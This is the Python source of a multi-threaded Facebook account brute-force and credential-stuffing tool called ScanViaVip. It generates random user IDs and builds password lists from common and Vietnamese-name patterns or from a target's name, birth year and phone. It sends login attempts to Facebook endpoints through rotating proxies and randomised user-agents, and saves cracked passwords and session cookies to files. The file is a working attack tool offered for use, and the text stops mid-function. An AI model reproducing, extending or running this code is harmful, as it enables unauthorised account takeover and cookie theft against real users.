#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════════════╗
# ║              ScanViaVip v6.0 - Ultimate Edition                    ║
# ║         Tích hợp Scan + BruteForce + Check Live + Multi-Thread    ║
# ║              Made by NPHUNG - Đệ nhất Scan Tool                    ║
# ╚══════════════════════════════════════════════════════════════════════╝
import os, sys, subprocess, time, uuid, random, json, base64, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

# ============================================================
# AUTO-INSTALL DEPENDENCIES
# ============================================================
REQUIRED_LIBS = ['requests', 'rich', 'bs4', 'httpx', 'urllib3', 'certifi', 'chardet', 'idna', 'cryptography']
missing = []

for lib in REQUIRED_LIBS:
    try:
        __import__(lib)
    except ImportError:
        missing.append(lib)

if missing:
    print(f"\033[1;33m[*] Installing missing modules: {', '.join(missing)}...\033[0m")
    for lib in missing:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("\033[1;32m[+] Done! Please restart the script.\033[0m")
    sys.exit(0)

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
requests.urllib3.disable_warnings()

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.box import Box, HEAVY
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()

# ============================================================
# CONFIGURATION - VIP SETTINGS
# ============================================================
class Config:
    TOOL_NAME = "ScanViaVip"
    VERSION = "6.0 Ultimate"
    AUTHOR = "NPHUNG"
    
    # Performance Settings
    MAX_WORKERS = 50          # Default thread count (crank it up)
    BRUTE_WORKERS = 75        # Threads for brute-force attacks
    TIMEOUT = 8               # Request timeout in seconds
    RETRIES = 2               # Retry attempts on failure
    
    # Proxy Settings
    USE_PROXY = False
    PROXY_LIST = []
    PROXY_FILE = "proxies.txt"
    
    # Storage Paths
    BASE_DIR = Path.home() / "ScanViaVip"
    RESULTS_DIR = BASE_DIR / "results"
    LOGS_DIR = BASE_DIR / "logs"
    
    # Output Files
    FILE_LIVE = "live_accounts.txt"
    FILE_2FA = "2fa_accounts.txt"
    FILE_DIE = "dead_accounts.txt"
    FILE_COOKIES = "cookies.json"
    FILE_BRUTE = "cracked_accounts.txt"
    FILE_SCAN_RESULT = "scan_results.txt"

# Auto-create directories
Config.BASE_DIR.mkdir(exist_ok=True)
Config.RESULTS_DIR.mkdir(exist_ok=True)
Config.LOGS_DIR.mkdir(exist_ok=True)

# ============================================================
# GRADIENT COLOR SYSTEM (TRẮNG -> XANH DƯƠNG)
# ============================================================
class Gradient:
    """Gradient text generator - White to Blue"""
    @staticmethod
    def rgb(r, g, b): return f"\033[38;2;{r};{g};{b}m"
    RESET = "\033[0m"
    
    @classmethod
    def print(cls, text, start=(255,255,255), end=(0,150,255)):
        if not text: return
        result = ""
        n = len(text) - 1 if len(text) > 1 else 1
        for i, char in enumerate(text):
            ratio = i / n
            r = int(start[0] + (end[0] - start[0]) * ratio)
            g = int(start[1] + (end[1] - start[1]) * ratio)
            b = int(start[2] + (end[2] - start[2]) * ratio)
            result += f"{cls.rgb(r, g, b)}{char}"
        result += cls.RESET
        print(result)
    
    @classmethod
    def center(cls, text, start=(255,255,255), end=(0,150,255)):
        try: w = os.get_terminal_size().columns
        except: w = 80
        padding = max(0, (w - len(text)) // 2)
        cls.print(" " * padding + text, start, end)

# ============================================================
# SESSION MANAGER - OPTIMIZED CONNECTIONS
# ============================================================
class SessionManager:
    """Manages optimized HTTP sessions with connection pooling"""
    _sessions = {}
    _lock = threading.Lock()
    
    @classmethod
    def get_session(cls):
        tid = threading.get_ident()
        with cls._lock:
            if tid not in cls._sessions:
                session = requests.Session()
                retry_strategy = Retry(
                    total=Config.RETRIES,
                    backoff_factor=0.3,
                    status_forcelist=[429, 500, 502, 503, 504]
                )
                adapter = HTTPAdapter(
                    pool_connections=20,
                    pool_maxsize=50,
                    max_retries=retry_strategy
                )
                session.mount("https://", adapter)
                session.mount("http://", adapter)
                session.trust_env = False
                cls._sessions[tid] = session
            return cls._sessions[tid]

# ============================================================
# PASSWORD ENGINE - SMART PASSWORD GENERATION
# ============================================================
class PasswordEngine:
    """Generates intelligent password lists"""
    
    # Core password sets
    BASIC = [
        '123456', '1234567', '12345678', '123456789', '1234567890',
        '123123', '123321', 'password', 'password123', '123456a',
        '111111', '000000', '666666', '888888', '999999',
        'qwerty123', 'abc123', 'abcd1234', 'abcde12345',
    ]
    
    VIETNAMESE = [
        'an123456', 'anh123456', 'tuan123', 'tuan123456',
        'nam123', 'nam123456', 'linh123', 'linh123456',
        'trang123', 'trang123456', 'minh123', 'minh123456',
        'ngoc123', 'ngoc123456', 'phuong123', 'phuong123456',
        'hung123', 'hung123456', 'hong123', 'hong123456',
        'huong123', 'huong123456', 'quynh123', 'quynh123456',
        'thanh123', 'thanh123456', 'thuy123', 'thuy123456',
        'cuong123', 'cuong123456', 'dung123', 'dung123456',
        'hien123', 'hien123456', 'thao123', 'thao123456',
    ]
    
    YEARS = [str(y) for y in range(1970, 2010)]
    
    COMMON_NAMES = [
        'anh', 'tuan', 'nam', 'linh', 'trang', 'minh', 'ngoc',
        'phuong', 'hung', 'hong', 'huong', 'quynh', 'thanh',
        'thuy', 'cuong', 'dung', 'hien', 'thao', 'uyen', 'khanh',
        'tung', 'son', 'hieu', 'tam', 'nhi', 'tai', 'loc',
        'lan', 'mai', 'hoa', 'long', 'duong', 'giang', 'ha',
        'anh', 'em', 'yeu', 'thuong', 'nho', 'mong', 'mo',
    ]

    @classmethod
    def generate_from_info(cls, name="", year="", phone=""):
        """Generate password list from personal information"""
        passwords = set()
        
        # Basic passwords always included
        passwords.update(cls.BASIC)
        passwords.update(cls.VIETNAMESE)
        
        if name:
            name_low = name.lower()
            name_up = name.upper()
            name_cap = name.capitalize()
            variations = [name_low, name_up, name_cap]
            
            for var in variations:
                for suffix in ['', '123', '1234', '12345', '123456', '@', '#', '!']:
                    password = f"{var}{suffix}"
                    if 6 <= len(password) <= 32:
                        passwords.add(password)
                    
                    if year:
                        password_y = f"{var}{year}"
                        if 6 <= len(password_y) <= 32:
                            passwords.add(password_y)
                        password_y2 = f"{var}{year[-2:]}"
                        if 6 <= len(password_y2) <= 32:
                            passwords.add(password_y2)
        
        if year:
            passwords.add(year)
            passwords.add(f"@{year}")
            passwords.add(f"{year}{year}")
        
        if phone:
            phone = ''.join(filter(str.isdigit, phone))
            for length in [6, 7, 8, 9]:
                if len(phone) >= length:
                    passwords.add(phone[-length:])
            passwords.add(phone)
        
        return [p for p in passwords if 6 <= len(p) <= 32]

    @classmethod
    def generate_massive(cls, count=5000):
        """Generate large password list with patterns"""
        passwords = set(cls.BASIC + cls.VIETNAMESE)
        
        for _ in range(count):
            pattern = random.randint(1, 8)
            if pattern == 1:
                passwords.add(random.choice(cls.COMMON_NAMES) + random.choice(cls.YEARS[-15:]))
            elif pattern == 2:
                passwords.add(random.choice(cls.COMMON_NAMES) + str(random.randint(100, 999)))
            elif pattern == 3:
                passwords.add(random.choice(cls.COMMON_NAMES).upper() + str(random.randint(1000, 9999)))
            elif pattern == 4:
                passwords.add(str(random.randint(10000000, 99999999)))
            elif pattern == 5:
                passwords.add(random.choice(cls.COMMON_NAMES) + '@' + random.choice(cls.YEARS[-10:]))
            elif pattern == 6:
                passwords.add('0' + str(random.randint(100000000, 999999999)))
            elif pattern == 7:
                passwords.add(random.choice(cls.YEARS) + random.choice(cls.COMMON_NAMES))
            else:
                passwords.add(random.choice(cls.COMMON_NAMES) + random.choice(['@', '#', '!', '.']) + str(random.randint(100, 999)))
        
        return [p for p in passwords if 6 <= len(p) <= 32]

    @classmethod
    def load_from_file(cls, filepath):
        """Load passwords from a file"""
        passwords = set()
        try:
            with open(filepath, 'r', errors='ignore') as f:
                for line in f:
                    pw = line.strip()
                    if 6 <= len(pw) <= 32:
                        passwords.add(pw)
        except Exception:
            pass
        return list(passwords)

# ============================================================
# PROXY MANAGER
# ============================================================
class ProxyManager:
    """Manages proxy rotation"""
    
    @staticmethod
    def parse(proxy_str):
        parts = proxy_str.strip().split(':')
        if len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
            return {'http': url, 'https': url}
        elif len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            return {'http': url, 'https': url}
        return None

    @staticmethod
    def load_from_file(filepath):
        proxies = []
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    parsed = ProxyManager.parse(line)
                    if parsed:
                        proxies.append(parsed)
        except:
            pass
        return proxies

    @staticmethod
    def get_random():
        if Config.USE_PROXY and Config.PROXY_LIST:
            return random.choice(Config.PROXY_LIST)
        return None

# ============================================================
# USER-AGENT GENERATOR
# ============================================================
class UserAgent:
    """Generates realistic User-Agent strings"""
    
    @staticmethod
    def random():
        browsers = [
            # Chrome on Windows
            lambda: f"Mozilla/5.0 (Windows NT {random.choice(['10.0','11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,140)}.0.{random.randint(6000,9000)}.{random.randint(100,200)} Safari/537.36",
            # Chrome on Mac
            lambda: f"Mozilla/5.0 (Macintosh; Intel Mac OS X {random.choice(['10_15_7','11_0','12_0','13_0','14_0'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,140)}.0.{random.randint(6000,9000)}.{random.randint(100,200)} Safari/537.36",
            # Firefox
            lambda: f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(120,140)}.0) Gecko/20100101 Firefox/{random.randint(120,140)}.0",
            # Edge
            lambda: f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,140)}.0.{random.randint(6000,9000)}.{random.randint(100,200)} Safari/537.36 Edg/{random.randint(120,140)}.0.{random.randint(1000,3000)}.{random.randint(50,200)}",
        ]
        return random.choice(browsers)()

# ============================================================
# FACEBOOK API ENGINE
# ============================================================
class FacebookEngine:
    """Core Facebook interaction engine"""
    
    @staticmethod
    def check_live(email, password, proxy=None):
        """Check if account is live, 2FA, or dead"""
        timestamp = int(time.time())
        enc_token = base64.b64encode(
            json.dumps({"type":0,"creation_time":timestamp,"callsite_id":381229079575946}, separators=(",",":")).encode()
        ).decode()
        
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "datr=rYw9aMMrvaIwTjzB3UvpfCBW; sb=rYw9aFQhwkp-k36jr7BlNegU;",
            "Host": "www.facebook.com",
            "Origin": "https://www.facebook.com",
            "Referer": "https://www.facebook.com/",
            "User-Agent": UserAgent.random(),
        }
        
        data = {
            "jazoest": "2933",
            "lsd": "AVq53wqah7M",
            "email": email,
            "login_source": "comet_headerless_login",
            "next": "",
            "encpass": f"#PWD_INSTAGRAM:0:{timestamp}:{password}"
        }
        
        params = {"privacy_mutation_token": enc_token, "next": ""}
        
        try:
            resp = requests.post(
                "https://www.facebook.com/login/",
                params=params,
                headers=headers,
                data=data,
                proxies=proxy,
                timeout=Config.TIMEOUT,
                verify=False
            )
            html = resp.text
            cookies = resp.cookies.get_dict()
            
            if "password that you&#039;ve entered is incorrect" in html:
                return "DIE", None
            elif "CheckpointDefaultSettingsDropdown" in html:
                return "2FA", cookies
            elif "c_user" in cookies:
                return "LIVE", cookies
            elif "You're Temporarily Blocked" in html:
                return "BLOCKED", None
            else:
                return "UNKNOWN", None
        except:
            return "ERROR", None

    @staticmethod
    def try_login_method1(email, password, proxy=None):
        """Login attempt using POST method"""
        session = SessionManager.get_session()
        try:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(email),
                'password': str(password),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': UserAgent.random(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
            }
            resp = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data,
                headers=headers,
                proxies=proxy,
                timeout=Config.TIMEOUT
            ).json()
            
            if 'session_key' in resp or 'www.facebook.com' in resp.get('error', {}).get('message', ''):
                return True
        except:
            pass
        return False

    @staticmethod
    def try_login_method2(email, password, proxy=None):
        """Login attempt using GET method (faster)"""
        session = SessionManager.get_session()
        try:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': UserAgent.random(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = (
                f"https://b-api.facebook.com/method/auth.login"
                f"?format=json"
                f"&email={email}"
                f"&password={password}"
                f"&credentials_type=device_based_login_password"
                f"&generate_session_cookies=1"
                f"&error_detail_type=button_with_disabled"
                f"&source=device_based_login"
                f"&meta_inf_fbmeta="
                f"¤tly_logged_in_userid=0"
                f"&method=GET"
                f"&locale=en_US"
                f"&client_country_code=US"
                f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                f"&fb_api_req_friendly_name=authenticate"
                f"&cpl=true"
            )
            resp = session.get(url, headers=headers, proxies=proxy, timeout=Config.TIMEOUT).json()
            if 'session_key' in str(resp):
                return True
        except:
            pass
        return False

# ============================================================
# CORE SCANNER
# ============================================================
class CoreScanner:
    """Main scanning and brute-force engine"""
    
    def __init__(self):
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'skipped': 0,
            'start_time': 0,
            'lock': threading.Lock()
        }
        self.cracked_accounts = []
    
    def update_stats(self, key, delta=1):
        with self.stats['lock']:
            self.stats[key] += delta
    
    def get_stats(self):
        with self.stats['lock']:
            return dict(self.stats)
    
    def save_result(self, filename, data):
        filepath = Config.RESULTS_DIR / filename
        with open(filepath, 'a') as f:
            f.write(data + '\n')
    
    def process_account(self, uid, password, proxy=None):
        """Process a single account - check and save results"""
        self.update_stats('total')
        
        # Try both methods
        success = False
        for method in [FacebookEngine.try_login_method2, FacebookEngine.try_login_method1]:
            try:
                if method(uid, password, proxy):
                    success = True
                    break
            except:
                pass
        
        if success:
            self.update_stats('success')
            # Check live status
            status, cookies = FacebookEngine.check_live(uid, password, proxy)
            
            result_line = f"{uid}|{password}"
            
            if status == "LIVE":
                self.save_result(Config.FILE_LIVE, result_line)
                if cookies:
                    self.save_result(Config.FILE_COOKIES, json.dumps({uid: cookies}))
                self.cracked_accounts.append((uid, password, "LIVE"))
                return uid, password, "LIVE"
            elif status == "2FA":
                self.save_result(Config.FILE_2FA, result_line)
                self.cracked_accounts.append((uid, password, "2FA"))
                return uid, password, "2FA"
            elif status == "DIE":
                self.save_result(Config.FILE_DIE, result_line)
                return uid, password, "DIE"
            else:
                self.save_result(Config.FILE_SCAN_RESULT, result_line)
                return uid, password, "UNKNOWN"
        else:
            self.update_stats('failed')
            return uid, None, "FAILED"

    def scan_uid_list(self, uid_list, password_list, method_label="SCAN"):
        """Scan a list of UIDs with given passwords using thread pool"""
        self.stats['start_time'] = time.time()
        total_uids = len(uid_list)
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
        ) as progress:
            task = progress.add_task(f"[cyan]Scanning {total_uids} UIDs...", total=total_uids)
            
            with ThreadPoolExecutor(max_workers=Config.MAX_WORKERS) as executor:
                futures = {}
                for uid in uid_list:
                    for pw in password_list[:10]:  # Limit per UID for scan mode
                        future = executor.submit(self.process_account, uid, pw, ProxyManager.get_random())
                        futures[future] = uid
                
                completed = 0
                for future in as_completed(futures):
                    completed += 1
                    progress.update(task, advance=1)
                    result = future.result()
                    if result and result[2] == "LIVE":
                        console.print(f"[green]💀 LIVE: {result[0]} | {result[1]}[/]")
                    elif result and result[2] == "2FA":
                        console.print(f"[yellow]⚠ 2FA: {result[0]} | {result[1]}[/]")
        
        elapsed = time.time() - self.stats['start_time']
        stats = self.get_stats()
        console.print(f"\n[bold green]✅ Done![/] Total: {stats['total']} | Live: {stats['success']} | Time: {elapsed:.1f}s")
        return self.cracked_accounts

    def brute_uid(self, uid, password_list):
        """Brute-force a single UID with large password list"""
        self.stats['start_time'] = time.time()
        
        # Split passwords into chunks for threading
        chunk_size = max(1, len(password_list) // Config.BRUTE_WORKERS)
        chunks = [password_list[i:i+chunk_size] for i in range(0, len(password_list), chunk_size)]
        
        cracked = False
        found_password = None
        
        def try_password_chunk(passwords):
            nonlocal cracked, found_password
            if cracked:
                return None
            for pw in passwords:
                if cracked:
                    return None
                result = self.process_account(uid, pw, ProxyManager.get_random())
                if result and result[1]:
                    cracked = True
                    found_password = result[1]
                    return result
            return None
        
        with ThreadPoolExecutor(max_workers=Config.BRUTE_WORKERS) as executor:
            futures = [executor.submit(try_password_chunk, chunk) for chunk in chunks]
            for future in as_completed(futures):
                result = future.result()
                if result and result[1]:
                    break
        
        elapsed = time.time() - self.stats['start_time']
        stats = self.get_stats()
        
        if cracked:
            console.print(f"\n[bold green]💀 CRACKED![/] UID: {uid} | Password: {found_password} | Time: {elapsed:.1f}s")
            self.save_result(Config.FILE_BRUTE, f"{uid}|{found_password}")
            return uid, found_password
        else:
            console.print(f"\n[bold red]❌ Failed![/] UID: {uid} | Tried: {stats['total']} | Time: {elapsed:.1f}s")
            return uid, None

# ============================================================
# BANNER SYSTEM
# ============================================================
def show_banner():
    console.clear()
    banner_text = f"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║    ███████╗ ██████╗ █████╗ ███╗   ██╗    ██╗   ██╗██╗ █████╗     ║
║    ██╔════╝██╔════╝██╔══██╗████╗  ██║    ██║   ██║██║██╔══██╗    ║
║    ███████╗██║     ███████║██╔██╗ ██║    ██║   ██║██║███████║    ║
║    ╚════██║██║     ██╔══██║██║╚██╗██║    ╚██╗ ██╔╝██║██╔══██║    ║
║    ███████║╚██████╗██║  ██║██║ ╚████║     ╚████╔╝ ██║██║  ██║    ║
║    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝      ╚═══╝  ╚═╝╚═╝  ╚═╝    ║
║                                                                  ║
║                    {Config.TOOL_NAME} v{Config.VERSION}                          ║
║                    Author: {Config.AUTHOR}                                       ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""
    Gradient.print(banner_text, (255,255,255), (0,150,255))
    
    proxy_status = "[green]ON ✓[/]" if Config.USE_PROXY else "[red]OFF ✗[/]"
    console.print(f"  Proxy: {proxy_status}  |  Proxies: [cyan]{len(Config.PROXY_LIST)}[/]  |  Threads: [cyan]{Config.MAX_WORKERS} scan / {Config.BRUTE_WORKERS} brute[/]")
    console.print("  " + "─" * 65)

# ============================================================
# MENU SYSTEM
# ============================================================
def menu_main():
    scanner = CoreScanner()
    
    while True:
        show_banner()
        
        table = Table(title="[bold cyan]🎯 MAIN MENU[/]", box=HEAVY, border_style="cyan")
        table.add_column("#", style="red", width=5)
        table.add_column("Function", style="white")
        table.add_column("Description", style="dim")
        
        table.add_row("1", "🔍 Fast Scan", "Scan UIDs with default passwords (fast)")
        table.add_row("2", "💀 BruteForce UID", "Attack single UID with massive password list")
        table.add_row("3", "📋 BruteForce List", "Attack UIDs from file")
        table.add_row("4", "🔧 Password Generator", "Generate smart password lists")
        table.add_row("5", "⚙ Settings", "Configure proxy, threads, and more")
        table.add_row("6", "📊 View Results", "View cracked accounts")
        table.add_row("7", "📖 Help", "Detailed usage guide")
        table.add_row("0", "🚪 Exit", "Close the tool")
        
        console.print(table)
        console.print("  " + "─" * 65)
        
        choice = console.input("[bold cyan]👉 Choose: [/]").strip()
        
        if choice == '1':
            menu_scan(scanner)
        elif choice == '2':
            menu_brute_single(scanner)
        elif choice == '3':
            menu_brute_list(scanner)
        elif choice == '4':
            menu_password_gen()
        elif choice == '5':
            menu_settings()
        elif choice == '6':
            view_results()
        elif choice == '7':
            show_help()
        elif choice == '0':
            console.print("[bold red]👋 Goodbye![/]")
            sys.exit(0)
        else:
            console.print("[red]❌ Invalid choice![/]")
            time.sleep(1)

def menu_scan(scanner):
    show_banner()
    console.print("[bold cyan]🔍 FAST SCAN MODE[/]")
    console.print("  " + "─" * 65)
    
    console.print("[bold]Select UID Series:[/]")
    console.print("  [A] All 2010-2014")
    console.print("  [B] 100003/4 Series")  
    console.print("  [C] 2009 Series")
    console.print("  [D] 2024+ Series (61...)")
    console.print("  [E] Custom UID list from file")
    
    choice = console.input("[bold cyan]👉 Choose (A/B/C/D/E): [/]").strip().upper()
    
    if choice == 'E':
        filepath = console.input("[cyan]UID file path: [/]").strip()
        if os.path.exists(filepath):
            with open(filepath) as f:
                uid_list = [line.strip() for line in f if line.strip().isdigit()]
        else:
            console.print("[red]File not found![/]")
            return
    else:
        try:
            limit = int(console.input("[cyan]Number of UIDs to generate: [/]"))
        except:
            console.print("[red]Invalid number![/]")
            return
        
        if choice == 'A':
            uid_list = ['10000' + str(random.randint(1000000000, 4999999999)) for _ in range(limit)]
        elif choice == 'B':
            prefixes = ['100003', '100004']
            uid_list = [random.choice(prefixes) + ''.join(random.choices('0123456789', k=9)) for _ in range(limit)]
        elif choice == 'C':
            uid_list = ['1000004' + ''.join(random.choices('0123456789', k=8)) for _ in range(limit)]
        elif choice == 'D':
            uid_list = ['61' + ''.join(random.choices('0123456789', k=12)) for _ in range(limit)]
        else:
            return
    
    console.print(f"[green]Generated {len(uid_list)} UIDs[/]")
    
    method = console.input("[cyan]Method (A=POST, B=GET faster): [/]").strip().upper()
    
    # Prepare password list for scanning
    passwords = PasswordEngine.BASIC[:15]  # Default passwords for scan
    
    console.print(f"[yellow]Starting scan with {Config.MAX_WORKERS} threads...[/]")
    results = scanner.scan_uid_list(uid_list, passwords)
    
    console.input("\n[bold]Press Enter to continue...[/]")

def menu_brute_single(scanner):
    show_banner()
    console.print("[bold red]💀 BRUTEFORCE SINGLE UID[/]")
    console.print("  " + "─" * 65)
    
    uid = console.input("[bold cyan]👉 Target UID: [/]").strip()
    if not uid.isdigit():
        console.print("[red]Invalid UID![/]")
        return
    
    console.print("\n[bold]Password Source:[/]")
    console.print("  [1] Default + Vietnamese common")
    console.print("  [2] Generate from info")
    console.print("  [3] Load from file")
    console.print("  [4] Massive auto-generate (5000+)")
    
    choice = console.input("[bold cyan]👉 Choose: [/]").strip()
    
    if choice == '1':
        passwords = PasswordEngine.BASIC + PasswordEngine.VIETNAMESE + PasswordEngine.YEARS
    elif choice == '2':
        name = console.input("[cyan]Name: [/]").strip()
        year = console.input("[cyan]Birth year: [/]").strip()
        phone = console.input("[cyan]Phone: [/]").strip()
        passwords = PasswordEngine.generate_from_info(name, year, phone)
    elif choice == '3':
        filepath = console.input("[cyan]Password file path: [/]").strip()
        passwords = PasswordEngine.load_from_file(filepath)
        if not passwords:
            console.print("[red]Failed to load! Using defaults.[/]")
            passwords = PasswordEngine.BASIC + PasswordEngine.VIETNAMESE
    elif choice == '4':
        try:
            count = int(console.input("[cyan]Number of passwords to generate: [/]"))
        except:
            count = 5000
        passwords = PasswordEngine.generate_massive(count)
    else:
        passwords = PasswordEngine.BASIC + PasswordEngine.VIETNAMESE
    
    console.print(f"[green]Loaded {len(passwords)} passwords[/]")
    console.print(f"[yellow]Starting brute-force with {Config.BRUTE_WORKERS} threads...[/]")
    
    scanner.brute_uid(uid, passwords)
    console.input("\n[bold]Press Enter to continue...[/]")

def menu_brute_list(scanner):
    show_banner()
    console.print("[bold red]💀 BRUTEFORCE UID LIST[/]")
    console.print("  " + "─" * 65)
    
    uid_file = console.input("[bold cyan]👉 UID file path: [/]").strip()
    if not os.path.exists(uid_file):
        console.print("[red]File not found![/]")
        return
    
    with open(uid_file) as f:
        uid_list = [line.strip() for line in f if line.strip().isdigit()]
    
    console.print(f"[green]Loaded {len(uid_list)} UIDs[/]")
    
    pw_file = console.input("[bold cyan]👉 Password file path: [/]").strip()
    if os.path.exists(pw_file):
        passwords = PasswordEngine.load_from_file(pw_file)
    else:
        console.print("[yellow]Using default passwords[/]")
        passwords = PasswordEngine.BASIC + PasswordEngine.VIETNAMESE
    
    console.print(f"[green]Loaded {len(passwords)} passwords[/]")
    console.print(f"[yellow]Starting attack with {Config.MAX_WORKERS} threads...[/]")
    
    for uid in uid_list:
        result = scanner.brute_uid(uid, passwords)
        if result and result[1]:
            console.print(f"[bold green]💀 CRACKED: {result[0]} | {result[1]}[/]")
    
    console.input("\n[bold]Press Enter to continue...[/]")

def menu_password_gen():
    show_banner()
    console.print("[bold cyan]🔧 PASSWORD GENERATOR[/]")
    console.print("  " + "─" * 65)
    
    console.print("[bold]Generation Mode:[/]")
    console.print("  [1] From personal info")
    console.print("  [2] Massive auto-generate")
    console.print("  [3] Combine existing files")
    
    choice = console.input("[bold cyan]👉 Choose: [/]").strip()
    
    passwords = []
    if choice == '1':
        name = console.input("[cyan]Name: [/]").strip()
        year = console.input("[cyan]Birth year: [/]").strip()
        phone = console.input("[cyan]Phone: [/]").strip()
        passwords = PasswordEngine.generate_from_info(name, year, phone)
    elif choice == '2':
        try:
            count = int(console.input("[cyan]Count: [/]"))
        except:
            count = 10000
        passwords = PasswordEngine.generate_massive(count)
    elif choice == '3':
        files = console.input("[cyan]File paths (comma separated): [/]").strip()
        for f in files.split(','):
            f = f.strip()
            if os.path.exists(f):
                passwords.extend(PasswordEngine.load_from_file(f))
        passwords = list(set(passwords))
    
    console.print(f"[green]Generated {len(passwords)} unique passwords[/]")
    
    save = console.input("[cyan]Save to file? (y/n): [/]").strip().lower()
    if save == 'y':
        filename = console.input("[cyan]Filename: [/]").strip()
        if not filename:
            filename = f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = Config.BASE_DIR / filename
        with open(filepath, 'w') as f:
            f.write('\n'.join(passwords))
        console.print(f"[green]Saved to: {filepath}[/]")
    
    console.input("\n[bold]Press Enter to continue...[/]")

def menu_settings():
    global Config
    
    while True:
        show_banner()
        console.print("[bold cyan]⚙ SETTINGS[/]")
        console.print("  " + "─" * 65)
        
        console.print(f"  [1] Proxy: {'[green]ON[/]' if Config.USE_PROXY else '[red]OFF[/]'} ({len(Config.PROXY_LIST)} proxies)")
        console.print(f"  [2] Scan Threads: {Config.MAX_WORKERS}")
        console.print(f"  [3] Brute Threads: {Config.BRUTE_WORKERS}")
        console.print(f"  [4] Timeout: {Config.TIMEOUT}s")
        console.print(f"  [5] Add Proxies")
        console.print(f"  [6] Load Proxies from File")
        console.print(f"  [7] Clear Proxies")
        console.print(f"  [0] Back")
        
        choice = console.input("[bold cyan]👉 Choose: [/]").strip()
        
        if choice == '1':
            Config.USE_PROXY = not Config.USE_PROXY
        elif choice == '2':
            try:
                Config.MAX_WORKERS = int(console.input("[cyan]Threads (10-200): [/]"))
                Config.MAX_WORKERS = max(10, min(200, Config.MAX_WORKERS))
            except:
                pass
        elif choice == '3':
            try:
                Config.BRUTE_WORKERS = int(console.input("[cyan]Threads (10-300): [/]"))
                Config.BRUTE_WORKERS = max(10, min(300, Config.BRUTE_WORKERS))
            except:
                pass
        elif choice == '4':
            try:
                Config.TIMEOUT = int(console.input("[cyan]Timeout (3-30): [/]"))
                Config.TIMEOUT = max(3, min(30, Config.TIMEOUT))
            except:
                pass
        elif choice == '5':
            console.print("[yellow]Enter proxies (ip:port or ip:port:user:pass), END to finish:[/]")
            while True:
                line = console.input().strip()
                if line.upper() == 'END':
                    break
                if line:
                    parsed = ProxyManager.parse(line)
                    if parsed:
                        Config.PROXY_LIST.append(parsed)
        elif choice == '6':
            filepath = console.input("[cyan]File path: [/]").strip()
            if os.path.exists(filepath):
                new_proxies = ProxyManager.load_from_file(filepath)
                Config.PROXY_LIST.extend(new_proxies)
                console.print(f"[green]Loaded {len(new_proxies)} proxies[/]")
            time.sleep(1)
        elif choice == '7':
            Config.PROXY_LIST.clear()
        elif choice == '0':
            break

def view_results():
    show_banner()
    console.print("[bold cyan]📊 RESULTS[/]")
    console.print("  " + "─" * 65)
    
    result_files = {
        "Live Accounts": Config.RESULTS_DIR / Config.FILE_LIVE,
        "2FA Accounts": Config.RESULTS_DIR / Config.FILE_2FA,
        "Cracked Accounts": Config.RESULTS_DIR / Config.FILE_BRUTE,
        "Dead Accounts": Config.RESULTS_DIR / Config.FILE_DIE,
    }
    
    for name, filepath in result_files.items():
        if filepath.exists():
            count = sum(1 for _ in open(filepath))
            console.print(f"  [bold]{name}:[/] [green]{count}[/] accounts → {filepath}")
        else:
            console.print(f"  [bold]{name}:[/] [dim]No data yet[/]")
    
    console.print("\n  " + "─" * 65)
    
    view = console.input("[cyan]View file content? (1=Live, 2=2FA, 3=Cracked, 0=Back): [/]").strip()
    
    file_map = {
        '1': Config.RESULTS_DIR / Config.FILE_LIVE,
        '2': Config.RESULTS_DIR / Config.FILE_2FA,
        '3': Config.RESULTS_DIR / Config.FILE_BRUTE,
    }
    
